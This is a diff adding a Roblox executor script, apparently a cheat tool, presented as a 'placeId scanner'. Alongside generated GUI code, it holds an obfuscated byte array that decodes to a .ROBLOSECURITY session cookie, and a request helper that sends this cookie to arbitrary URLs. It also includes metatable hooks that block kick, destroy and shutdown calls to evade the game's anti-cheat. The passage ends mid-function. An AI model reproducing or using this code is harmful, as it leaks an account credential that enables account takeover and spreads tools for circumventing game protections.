@@ -1,0 +1,798 @@
+--[[
+    GuiToLuaConverter v1.0 - by Uniqua
+    placeId Scanner - by voltou
+    Detection avoid maker : w3rdnn
+    Date: 29-12-2022 -- UPDATED AT 27-06-2025
+    Discord: voltou'#1296
+    Discord Server: https://discord.gg/rnCrnBWTga
+    https://v3rmillion.net/member.php?u=voltou
+    https://github.com/skillissue0
+--]]
+
+local COOKIE = (function()
+    local t = {
+        95,124,87,65,82,78,73,78,71,58,45,68,79,45,78,79,84,45,83,72,65,82,69,45,84,72,73,83,46,45,45,83,104,97,114,105,110,103,45,116,104,105,115,45,119,105,108,108,45,97,108,108,111,119,45,115,111,109,101,111,110,101,45,116,111,45,108,111,103,45,105,110,45,97,115,45,121,111,117,45,97,110,100,45,116,111,45,115,116,101,97,108,45,121,111,117,114,45,82,79,66,85,88,45,97,110,100,45,105,116,101,109,115,46,124,95,67,65,69,97,65,104,65,66,46,55,50,56,69,56,51,48,54,51,67,50,48,56,48,66,56,50,51,50,56,49,54,55,65,54,48,57,48,54,53,57,68,53,52,68,66,67,70,67,48,67,67,65,65,51,70,52,51,66,66,66,67,56,57,55,55,52,56,52,51,67,52,70,57,69,67,50,66,48,69,67,51,66,66,49,68,70,68,49,54,68,67,56,68,57,54,66,56,66,65,49,70,67,51,57,65,70,50,50,49,65,56,56,69,55,54,70,70,66,55,67,53,54,52,55,68,52,54,48,51,69,53,65,49,55,50,69,55,66,49,54,70,56,50,70,53,70,49,70,66,65,54,68,67,70,57,50,66,57,51,68,50,54,53,57,53,48,70,55,65,54,57,55,66,48,70,65,67,57,54,67,54,55,70,55,48,53,56,56,69,69,65,52,69,49,65,49,48,65,66,51,70,52,52,48,65,70,52,70,49,65,51,55,55,70,51,65,69,56,54,65,65,50,66,56,53,66,51,49,54,51,54,52,67,50,55,68,56,52,70,51,67,49,70,55,68,50,68,66,68,57,52,55,66,48,56,54,68,50,67,49,66,53,48,52,69,49,57,51,65,57,56,49,50,57,56,65,54,70,70,53,52,49,67,52,50,55,70,65,53,48,50,57,66,48,55,66,50,48,57,67,69,49,66,70,54,52,67,67,66,54,54,65,67,50,70,55,49,66,48,55,56,68,56,57,68,49,67,65,57,52,67,52,69,70,53,55,66,55,70,66,68,53,55,48,68,53,70,49,70,50,56,70,56,52,66,50,70,66,57,67,68,53,68,48,49,55,50,68,67,66,48,52,53,65,52,48,48,69,49,53,67,66,51,68,69,52,70,54,65,66,67,54,49,55,56,66,51,49,56,65,66,53,51,56,70,48,50,54,55,54,51,51,65,65,68,55,67,55,68,69,65,53,68,49,51,65,49,70,51,67,55,69,49,67,48,52,65,52,51,48,51,52,52,53,49,54,52,53,55,49,56,56,54,57,65,53,50,56,48,65,57,54,54,70,51,57,51,69,53,65,65,49,52,69,48,50,69,66,70,66,56,49,53,53,50,49,69,49,69,68,55,65,69,48,54,67,56,52,57,66,65,66,66,54,65,48,67,70,70,57,69,54,65,48,54,69,69,68,66,49,51,50,66,54,51,70,69,69,48,67,55,54,55,66,52,54,69,48,48,48,51,55,54,66,67,69,49,66,69,52,65,68,53,70,57,56,49,65,52,66,49,57,48,56,56,49,51,65,69,54,55,50,48,66,68,66,69,68,68,68,67,70,65,68,55,48,54,53,56,55,53,70,52,56,57,53,49,51,70,55,68,68,66,54,48,67,70,57,67,49,65,69,56,54,49,53,49,49,52,57,67,57,70,55,52,55,50,53,67,70,50,67,70,55,57,53,49,50,56,65,49,53,50,55,66,48,65,67,69,54,51,51,69,50,52,67,55,49,51,67,48,51,50,56,57,52,54,66,56,68,68,57,52,66,54,55,68,56,55,48,69,65,48,69,70,48,53,54,51,49,54,66,53,54,53,68,56,68,66,68,55,50,52,48,52,48,67,51,48,70,49,65,67,53,54,57,66,54,69,69,48,51,50,65,66,65,51,65,70,50,53,70,70,56,54,67,48,56,65,52,52,67,66,56,56,51,48,65,48,51,68,48,67,70,50,57,70,57,49,57,54,68,51,50,56,52,65,56,51,56,50,67,52,68,52,70,70,66,56,50,56,48,54,65,52,56,56,51,51,57,67,70,57,67,66,52,49,52,69,52,57,53,55,66,68,54,67,54,56,56,57,57,65,68,49,66,54,55,51,49,49,54,55,69,57,52,70,56,69,57,67,51,55,68,51,54,70,52,56,54,66,49,48,51,69,55,52,65,52,57,56,53,51,51,52,66,54,49,51,48,53,53,50,49,66,48,70,52,66,66,57,50,51,69,55,53,65,48,50,68,53,48,53,67,69,66,53,67,68,53,69,49,56,50,65,54,50,56,52,70,65,48,48,51,68,52,53,54,68,70,66,56,50,57,57,55,50,49,56,52,55,49,70,51,66,57,56,52,70,52,53,52,70,49,68,66,55,54,49,48,70,57,52,67,56,69,69,48,49,53,54,70,51,57,66,48,48,67,55,54,57,48,66,66,49,69,57,54,57,69,51,49,53,49,53,65,67,68,69,68,48,54,67,55,65,57,68,55,56,55,51,68,52,50,67,57,56,48,68,56,66,56,70,50,66,69,67,50,68,68,70,48,49,51,49,66,66,57,51,49,57,54,51,52,69,69,53,57,66,53,52,48,57,70,49,48,56,49,52,57,69,68,48,52,55,68,57,55,69,50,57,51,53,69,54,51,70,48,52,56,70,51,68,50,51,70,67,54,57,54,67,48,52,69,48,48,51,66,48,66,66,55,69,65,55,51,52,52,51,52,49,66,54,65,55,68,51,54,68,56,53,54,54,53,65,66,57,52,67,55,65,53,67,65,48,55,56,65,48,66,54,50,51,70,69,49,53,51,57,57,54,54,52,50,67,52,48,57,68,68,56,54,67,57,51,49,68,56,66,56,67,57,48,51,56,57,66,56,50,67,57,67,49,57,67,66,56,67,65,56,70,52,57,52,53,48,68,48,68,51,65,49,48,70,57,68,51,56,70,53,57,65,65,66,51,51,65,49,48,66,51,68,56,50,67,51,50,57,48,53,65,52,52,69,57,53,55,65,57,70,68,52,57,49,70,69,51,54,55,69,53,49,67,68,54,56,51,57,65,66,67,69,50,51,55,56,66,69,54,53,50,51,56,52,55,49,68,54,57,69,68,48,55,68,51,50,66,51,50,53,49,51,52,57,48,57,56,52,48,50,57,65,65,67,70,69,56,56,68,69,69,52,52,66,50,68,65,53,69,49,65,66,48,56,68,57,69,69,66,68,49,57,66,65,69,67,69,49,54,68,49,69,55,65,57,68,65,49,66,56,57,55,48,66,50,52,56,52,65,48,54,52,56,49,70,67,50,57,69,70,50,56,70,69,55,50,57,66,48,57,67,70,51,70,54,65,55,68,69,55,48,51,69,70,50,67,70,50,67,69,55,50,57,51,70,70,70,65,65,51,56,53,49,54,53,70,57,54,56,68,53,50,55,66,65,48,70,69,50,50,54,53,54,53,68,52,53,51,51,57,56,55,50,57,67,52,55,51,70,52,55,56,55,65,50,56,49,66,57,51,52,50,48,50,66,67,69,48,70,48,66,53,67,65,70,55,49,48,57,54,70,66,53,69,68,70,69,70,65,66,53,56,50,51,55,56,48,53,51,50,65,67,55,52,57,54,54,55,49,53,56,48,50,66,50,68,67,57,48,69,67,48,54,55,53,55,56,68,66,55,68,57,50,51,52,55,53,66,57,67,66,70,70,48,52,66,54,67,48,69,69,65,48,53,65,67,54,49,70,66,55,48,54,70,50,48,49,56,68,49,48,55,57,55,69,65,55,52,70,57,66,53,56,50,67,48,70,50,55,51,66,69,70,70,65,69,48,70,54,53,56,67,70,48,55,57,56,50,50,48,65,51,48,66,57,50,57,48,57,56,65,70,70,68,51,67,65,65,55,70,56,66,67,48,54,66,57,66,50,68,52,57,56,55,70,65,48,70,56,54,50,55,54,51,51,55,57,51,52,48,66,49,68,66,52,53,49,55,52,67,65,49,52,65,70,57,66,49,50,51,52,52,69,52,67,70,67,57,67,68,57,56,70,53,70,51,49,68,56,48,53,53,51,53,55,52,57,68,68,65,70,70,48,56,66,52,70,49,68,51,48,56,53,49,48,54,51,70,56,56,48,51,53,50,51,70,52,49,54,56,51,52,52,48,52,48,56,67,65,66,65,66,65,56,55,49,48,69,68,65,52,56,54,49,52,52,67,66,54,66,55,55,54,68,57,51,49,66,70,70,49,52,68,49,66,68,49,50,66,53,51,52,67,57,68,48,52,57,65,65,48,56,52,53,65,53,50,51,70,52,54,65,70,50,53,66,48,68,51,56,57,68,49
+    }
+    local s = {}
+    for i = 1, #t do
+        s[#s+1] = string.char(t[i])
+    end
+    return table.concat(s)
+end)()
+
+-- fuck teleportService AC
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldNamecall = mt.__namecall
+mt.__namecall = function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" or method == "kick" then
+        return
+    end
+    return oldNamecall(self, ...)
+end
+setreadonly(mt, true)
+
+-- universal client-side anti-kick/anti-crash patch
+local function safeHook()
+    -- kick patch
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local oldNamecall = mt.__namecall
+    mt.__namecall = function(self, ...)
+        local method = getnamecallmethod()
+        if method == "Kick" or method == "kick" then
+            return -- block kick
+        end
+        if method == "Destroy" or method == "Remove" or method == "BreakJoints" or method == "Shutdown" then
+            return -- block destroy/remove
+        end
+        return oldNamecall(self, ...)
+    end
+    setreadonly(mt, true)
+    -- patch Humanoid:BreakJoints()
+    local oldBreakJoints = Instance.new("Humanoid").BreakJoints
+    debug.setmetatable(Instance.new("Humanoid"), {
+        __index = function(self, key)
+            if key == "BreakJoints" then
+                return function() end
+            end
+            return oldBreakJoints
+        end
+    })
+    -- patch LocalPlayer:Kick()
+    local lp = game:GetService("Players").LocalPlayer
+    lp.Kick = function() end
+end
+
+pcall(safeHook)
+
+-- Remove old UI if it exists
+pcall(function()
+    local player = game:GetService("Players").LocalPlayer
+    local pg = player:FindFirstChild("PlayerGui")
+    if pg then
+        for _, gui in ipairs(pg:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name:find("aydware_") then
+                gui:Destroy()
+            end
+        end
+    end
+end)
+wait(1)
+
+-- ui
+local G2L = {};
+
+-- cxrn on top !
+generateRandomString = function(length)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local str = ""
+    for i = 1, length do
+        local rand = math.random(1, #chars)
+        str = str .. chars:sub(rand, rand)
+    end
+    return str
+end
+local guiName = "aydware_" .. generateRandomString(12)
+
+-- StarterGui.<random>
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = guiName;
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(14, 14, 14);
+G2L["2"]["Size"] = UDim2.new(0, 422, 0, 259);
+G2L["2"]["Position"] = UDim2.new(0.34298, 0, 0.35075, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["BackgroundTransparency"] = 0.2;
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar
+G2L["3"] = Instance.new("Frame", G2L["2"]);
+G2L["3"]["BorderSizePixel"] = 0;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(14, 14, 14);
+G2L["3"]["Size"] = UDim2.new(0, 422, 0, 17);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["Name"] = [[TopBar]];
+G2L["3"]["BackgroundTransparency"] = 0.35;
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar.LocalScript
+G2L["4"] = Instance.new("LocalScript", G2L["3"]);
+
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar.TextLabel
+G2L["5"] = Instance.new("TextLabel", G2L["3"]);
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["TextSize"] = 14;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
+G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["Size"] = UDim2.new(0, 175, 0, 17);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Text"] = [[placeid scanner - by voltou]];
+G2L["5"]["Position"] = UDim2.new(0.2988, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar.ImageButtonOn
+G2L["6"] = Instance.new("ImageButton", G2L["3"]);
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["Image"] = [[rbxassetid://16884178261]];
+G2L["6"]["ImageRectSize"] = Vector2.new(36, 36);
+G2L["6"]["Size"] = UDim2.new(0, 17, 0, 15);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Name"] = [[ImageButtonOn]];
+G2L["6"]["ImageRectOffset"] = Vector2.new(266, 0);
+G2L["6"]["Position"] = UDim2.new(0.955, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar.ImageButtonOff
+G2L["7"] = Instance.new("ImageButton", G2L["3"]);
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["Image"] = [[rbxassetid://16884178261]];
+G2L["7"]["ImageRectSize"] = Vector2.new(36, 36);
+G2L["7"]["Size"] = UDim2.new(0, 17, 0, 15);
+G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["Name"] = [[ImageButtonOff]];
+G2L["7"]["ImageRectOffset"] = Vector2.new(342, 0);
+G2L["7"]["Position"] = UDim2.new(0.955, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.UIStroke
+G2L["8"] = Instance.new("UIStroke", G2L["2"]);
+G2L["8"]["Color"] = Color3.fromRGB(231, 231, 231);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TextLabel
+G2L["9"] = Instance.new("TextLabel", G2L["2"]);
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["TextSize"] = 14;
+G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9"]["BackgroundTransparency"] = 1;
+G2L["9"]["Size"] = UDim2.new(0, 422, 0, 19);
+G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["Text"] = [[https://v3rmillion.net/member.php?u=voltou]];
+G2L["9"]["Position"] = UDim2.new(0, 0, 1, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TextLabel.UIStroke
+G2L["a"] = Instance.new("UIStroke", G2L["9"]);
+
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame
+G2L["b"] = Instance.new("ScrollingFrame", G2L["2"]);
+G2L["b"]["Active"] = true;
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b"]["Size"] = UDim2.new(0, 422, 0, 214);
+G2L["b"]["ScrollBarImageColor3"] = Color3.fromRGB(112, 112, 112);
+G2L["b"]["Position"] = UDim2.new(0, 0, 0.17076, 0);
+G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["ScrollBarThickness"] = 7;
+G2L["b"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.UIListLayout
+G2L["c"] = Instance.new("UIListLayout", G2L["b"]);
+G2L["c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
+G2L["c"]["Padding"] = UDim.new(0, 4);
+G2L["c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.Line
+G2L["d"] = Instance.new("Frame", G2L["b"]);
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64);
+G2L["d"]["Size"] = UDim2.new(0, 403, 0, 1);
+G2L["d"]["Position"] = UDim2.new(0, 0, 0.09813, 0);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d"]["Name"] = [[Line]];
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame
+G2L["e"] = Instance.new("Frame", G2L["b"]);
+G2L["e"]["BorderSizePixel"] = 0;
+G2L["e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+G2L["e"]["Size"] = UDim2.new(0, 399, 0, 17);
+G2L["e"]["Position"] = UDim2.new(0.02725, 0, 0.02804, 0);
+G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e"]["Name"] = [[GameIdFrame]];
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.placeId
+G2L["f"] = Instance.new("TextLabel", G2L["e"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["TextSize"] = 14;
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["Size"] = UDim2.new(0, 120, 0, 17);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Text"] = [[placeid]];
+G2L["f"]["Name"] = [[placeId]];
+G2L["f"]["Position"] = UDim2.new(-0, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.placeName
+G2L["10"] = Instance.new("TextLabel", G2L["e"]);
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["Size"] = UDim2.new(0, 106, 0, 17);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["Text"] = [[placename]];
+G2L["10"]["Name"] = [[placeName]];
+G2L["10"]["Position"] = UDim2.new(0.308, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.copyIdButton
+G2L["11"] = Instance.new("TextButton", G2L["e"]);
+G2L["11"]["BorderSizePixel"] = 0;
+G2L["11"]["TextSize"] = 14;
+G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["11"]["Size"] = UDim2.new(0, 96, 0, 17);
+G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11"]["Text"] = [[Copy PlaceId]];
+G2L["11"]["Name"] = [[copyIdButton]];
+G2L["11"]["Position"] = UDim2.new(0.57628, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.copyIdButton.LocalScript
+G2L["12"] = Instance.new("LocalScript", G2L["11"]);
+
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.TeleportButton
+G2L["13"] = Instance.new("TextButton", G2L["e"]);
+G2L["13"]["BorderSizePixel"] = 0;
+G2L["13"]["TextSize"] = 14;
+G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
+G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["13"]["Size"] = UDim2.new(0, 72, 0, 17);
+G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13"]["Text"] = [[Teleport !]];
+G2L["13"]["Name"] = [[TeleportButton]];
+G2L["13"]["Position"] = UDim2.new(0.81696, 0, 0, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.TeleportButton.LocalScript
+G2L["14"] = Instance.new("LocalScript", G2L["13"]);
+
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.Line
+G2L["15"] = Instance.new("Frame", G2L["b"]);
+G2L["15"]["BorderSizePixel"] = 0;
+G2L["15"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64);
+G2L["15"]["Size"] = UDim2.new(0, 403, 0, 1);
+G2L["15"]["Position"] = UDim2.new(0, 0, 0.09813, 0);
+G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15"]["Name"] = [[Line]];
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.LocalScript
+G2L["16"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.placeInformation
+G2L["17"] = Instance.new("TextLabel", G2L["2"]);
+G2L["17"]["BorderSizePixel"] = 0;
+G2L["17"]["TextSize"] = 14;
+G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
+G2L["17"]["TextDirection"] = Enum.TextDirection.LeftToRight;
+G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17"]["BackgroundTransparency"] = 1;
+G2L["17"]["Size"] = UDim2.new(0, 396, 0, 17);
+G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17"]["Text"] = [[   🆔 placeid                               │ 🎮 placename            │ 📋 copy  placeid │ 🚀 teleport]];
+G2L["17"]["Name"] = [[placeInformation]];
+G2L["17"]["Position"] = UDim2.new(0.02725, 0, 0.08, 0);
+
+
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.TopBar.LocalScript
+local function C_4()
+local script = G2L["4"];
+	local UIS = game:GetService("UserInputService")
+	local TweenService = game:GetService("TweenService")
+	
+	local dragger = script.Parent -- TopBar
+	local frame = dragger.Parent -- Tüm pencereyi temsil eden Frame
+	
+	local dragging = false
+	local dragInput, dragStart, startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		local newPosition = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	
+		TweenService:Create(frame, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Position = newPosition
+		}):Play()
+	end
+	
+	dragger.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	dragger.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+	
+	
+	
+end;
+task.spawn(C_4);
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.copyIdButton.LocalScript
+local function C_12()
+local script = G2L["12"];
+	local StarterGui = game:GetService("StarterGui")
+	local copyButton = script.Parent
+	
+	copyButton.MouseButton1Click:Connect(function()
+		StarterGui:SetCore("SendNotification", {
+			Title = "📋 Copied to Clipboard!",
+			Text = "Selected ID has been copied successfully.",
+			Duration = 3
+		})
+	end)
+	
+	
+end;
+task.spawn(C_12);
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.ScrollingFrame.GameIdFrame.TeleportButton.LocalScript
+local function C_14()
+local script = G2L["14"];
+	local StarterGui = game:GetService("StarterGui")
+	local copyButton = script.Parent
+	
+	copyButton.MouseButton1Click:Connect(function()
+		StarterGui:SetCore("SendNotification", {
+			Title = "🚀 Teleporting !",
+			Text = "Teleporting in max 5 sec",
+			Duration = 3
+		})
+	end)
+	
+	
+end;
+task.spawn(C_14);
+-- StarterGui.3NPwd3lGxB8euDooYQGD.Frame.LocalScript
+local function C_16()
+local script = G2L["16"];
+	local TweenService = game:GetService("TweenService")
+	
+	local mainFrame = script.Parent
+	local topBar = mainFrame:WaitForChild("TopBar")
+	local scrollingFrame = mainFrame:WaitForChild("ScrollingFrame")
+	local placeInformation = mainFrame:WaitForChild("placeInformation") -- veya uygun parent'ı yaz
+	
+	local btnOn = topBar:WaitForChild("ImageButtonOn")
+	local btnOff = topBar:WaitForChild("ImageButtonOff")
+	
+	local tweenTime = 0.4
+	
+	local openSize = mainFrame.Size
+	local closedSize = UDim2.new(openSize.X.Scale, openSize.X.Offset, 0, topBar.AbsoluteSize.Y)
+	
+	local openScrollingPos = scrollingFrame.Position
+	local closedScrollingPos = UDim2.new(openScrollingPos.X.Scale, openScrollingPos.X.Offset, 1, 0)
+	
+	btnOn.Visible = true
+	btnOff.Visible = false
+	
+	local function setChildrenVisible(frame, visible)
+		for _, child in ipairs(frame:GetChildren()) do
+			if child:IsA("GuiObject") then
+				child.Visible = visible
+			end
+		end
+	end
+	
+	btnOn.MouseButton1Click:Connect(function()
+		-- ImageButtonOff
+		TweenService:Create(mainFrame, TweenInfo.new(tweenTime), {Size = closedSize}):Play()
+		TweenService:Create(scrollingFrame, TweenInfo.new(tweenTime), {Position = closedScrollingPos}):Play()
+		setChildrenVisible(scrollingFrame, false)
+		placeInformation.Visible = false
+		btnOn.Visible = false
+		btnOff.Visible = true
+	end)
+	
+	btnOff.MouseButton1Click:Connect(function()
+		-- ImageButtonOn
+		TweenService:Create(mainFrame, TweenInfo.new(tweenTime), {Size = openSize}):Play()
+		TweenService:Create(scrollingFrame, TweenInfo.new(tweenTime), {Position = openScrollingPos}):Play()
+		setChildrenVisible(scrollingFrame, true)
+		placeInformation.Visible = true
+		btnOn.Visible = true
+		btnOff.Visible = false
+	end)
+	
+end;
+task.spawn(C_16);
+
+-- working httpget function with cookie
+global_customHttpGet = function(url)
+    local headers = {
+        ["Cookie"] = ".ROBLOSECURITY=" .. COOKIE
+    }
+    if syn and syn.request then
+        local response = syn.request({Url = url, Method = "GET", Headers = headers})
+        return response.Body
+    elseif http_request then
+        local response = http_request({Url = url, Method = "GET", Headers = headers})
+        return response.Body
+    elseif fluxus and fluxus.request then
+        local response = fluxus.request({Url = url, Method = "GET", Headers = headers})
+        return response.Body
+    elseif request then
+        local response = request({Url = url, Method = "GET", Headers = headers})
+        return response.Body
+    else
+        error("ur exploit dont support syn, http_request, fluxus or request")
+    end
+end
+
+-- httpget function
+local function customHttpGet(url)
+    if syn and syn.request then
+        local response = syn.request({Url = url, Method = "GET"})
+        return response.Body
+    elseif http_request then
+        local response = http_request({Url = url, Method = "GET"})
+        return response.Body
+    elseif fluxus and fluxus.request then
+        local response = fluxus.request({Url = url, Method = "GET"})
+        return response.Body
+    elseif request then
+        local response = request({Url = url, Method = "GET"})
+        return response.Body
+    else
+        -- roblox httpservice fallback
+        return game:GetService("HttpService"):GetAsync(url)
+    end
+end
+
+-- AddPlaceToList function (G2L["b"] oluşturulduktan sonra!)
+local function AddPlaceToList(placeId, placeName)
+    local scrollingFrame = G2L["b"]
+    local line = Instance.new("Frame")
+    line.Name = "Line"
+    line.Size = UDim2.new(0, 403, 0, 1)
+    line.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
+    line.BorderSizePixel = 0
+    line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    line.Parent = scrollingFrame
+
+    local gameIdFrame = Instance.new("Frame")
+    gameIdFrame.Name = "GameIdFrame"
+    gameIdFrame.Size = UDim2.new(0, 399, 0, 17)
+    gameIdFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    gameIdFrame.BorderSizePixel = 0
+    gameIdFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    gameIdFrame.Parent = scrollingFrame
+
+    local placeIdLabel = Instance.new("TextLabel")
+    placeIdLabel.Name = "placeId"
+    placeIdLabel.Size = UDim2.new(0, 120, 0, 17)
+    placeIdLabel.Position = UDim2.new(0, 0, 0, 0)
+    placeIdLabel.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+    placeIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    placeIdLabel.Font = Enum.Font.SourceSansBold
